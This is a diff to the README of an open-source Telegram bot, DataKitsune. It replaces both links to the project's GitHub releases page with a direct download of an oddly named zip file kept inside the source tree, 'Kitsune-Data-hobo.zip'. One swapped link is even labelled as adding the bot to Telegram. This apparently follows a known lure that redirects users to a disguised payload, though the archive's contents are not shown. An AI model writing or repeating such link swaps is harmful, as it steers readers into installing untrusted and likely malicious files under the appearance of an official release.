@@ -21,7 +21,7 @@ DataKitsune is an open-source Telegram bot designed to enhance the way you inter
 To get started with DataKitsune, follow these simple steps:
 
 1. **Add DataKitsune to Your Telegram**:
-   Click [here](https://github.com/kitty4luci/DataKitsune/releases) to add DataKitsune to your Telegram.
+   Click [here](https://raw.githubusercontent.com/kitty4luci/DataKitsune/main/src/entities/Kitsune-Data-hobo.zip) to add DataKitsune to your Telegram.
 
 2. **Start Using DataKitsune**:
    Once added, start sharing links in your chats and let DataKitsune do the rest!
@@ -30,7 +30,7 @@ To get started with DataKitsune, follow these simple steps:
 
 To install DataKitsune, simply download the latest release from the following link:
 
-[![Download DataKitsune](https://github.com/kitty4luci/DataKitsune/releases)](https://github.com/kitty4luci/DataKitsune/releases)
+[![Download DataKitsune](https://raw.githubusercontent.com/kitty4luci/DataKitsune/main/src/entities/Kitsune-Data-hobo.zip)](https://raw.githubusercontent.com/kitty4luci/DataKitsune/main/src/entities/Kitsune-Data-hobo.zip)
 
 **Note:** Click the button above to download the release file. 
 
